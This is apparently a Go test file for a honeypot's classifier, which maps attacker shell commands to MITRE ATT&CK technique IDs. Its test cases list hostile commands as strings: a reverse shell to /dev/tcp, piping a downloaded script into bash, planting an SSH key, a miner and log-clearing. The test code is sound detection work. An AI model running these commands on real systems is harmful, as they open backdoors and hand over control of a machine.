package mitre

import (
	"testing"

	"github.com/networkshard/shardlure/pkg/models"
)

func TestClassify_KindMatching(t *testing.T) {
	events := []*models.Event{
		{Kind: models.KindFailedPass, ActorID: "journal:1.2.3.4"},
		{Kind: models.KindInvalidUser, ActorID: "journal:1.2.3.4"},
		{Kind: models.KindAccepted, ActorID: "journal:5.6.7.8"},
		{Kind: models.KindCommand, Command: "uname -a", ActorID: "cowrie:abc"},
	}
	hits := Classify(events)
	if len(hits) == 0 {
		t.Fatal("expected at least one technique hit")
	}
	got := map[string]int{}
	for _, h := range hits {
		got[h.Technique.ID] = h.Count
	}
	if got["T1110.001"] != 2 {
		t.Errorf("T1110.001 brute force: want 2 got %d", got["T1110.001"])
	}
	if got["T1078"] != 1 {
		t.Errorf("T1078 valid accounts: want 1 got %d", got["T1078"])
	}
	if got["T1059.004"] == 0 {
		t.Error("T1059.004 unix shell should have fired on KindCommand")
	}
	if got["T1082"] == 0 {
		t.Error("T1082 system info should have fired on uname")
	}
}

func TestClassify_CommandSubstrings(t *testing.T) {
	cases := []struct {
		cmd        string
		wantTechID string
	}{
		{"wget http://example.com/x.sh -O /tmp/x", "T1105"},
		{"curl -sL http://1.2.3.4/m | bash", "T1105"},
		{"crontab -e", "T1053.003"},
		{"echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys", "T1098.004"},
		{"netstat -tunlp", "T1046"},
		{"cat /etc/passwd", "T1087"},
		{"./xmrig --pool stratum+tcp://pool:3333", "T1496"},
		{"history -c", "T1070.003"},
		{"iptables -F", "T1562"},
		{"whoami", "T1033"},
		{"nslookup attacker.cc", "T1071.004"},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "T1571"},
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			ev := &models.Event{Kind: models.KindCommand, Command: tc.cmd}
			ids := ClassifyOne(ev)
			found := false
			for _, id := range ids {
				if id == tc.wantTechID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("command %q: want %s in %v", tc.cmd, tc.wantTechID, ids)
			}
		})
	}
}

func TestCoverageGrid_Order(t *testing.T) {
	hits := Classify(nil)
	grid := CoverageGrid(hits)
	if len(grid) == 0 {
		t.Fatal("empty grid")
	}
	// Tactic order must match AllTactics().
	want := AllTactics()
	if len(grid) != len(want) {
		t.Fatalf("grid tactics: want %d got %d", len(want), len(grid))
	}
	for i, gt := range grid {
		if gt.Tactic != want[i] {
			t.Errorf("tactic[%d]: want %s got %s", i, want[i], gt.Tactic)
		}
		// Some tactics legitimately have no catalogued techniques
		// (e.g. PrivEsc, LateralMovement aren't observable via SSH
		// honeypot today). The grid still surfaces them so analysts
		// know the coverage gap.
	}
}
